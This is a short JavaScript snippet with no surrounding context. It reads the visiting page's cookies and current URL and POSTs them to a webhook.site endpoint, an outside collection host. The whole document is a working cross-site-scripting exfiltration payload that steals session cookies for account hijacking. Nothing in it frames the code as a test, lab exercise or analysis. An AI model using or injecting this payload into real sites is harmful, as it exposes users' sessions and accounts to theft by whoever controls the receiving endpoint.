fetch('https://webhook.site/6b53b9fa-cb91-45e0-8ac2-fb895c1c5407', {
  method: 'POST',
  body: JSON.stringify({cookies: document.cookie, url: location.href})
});
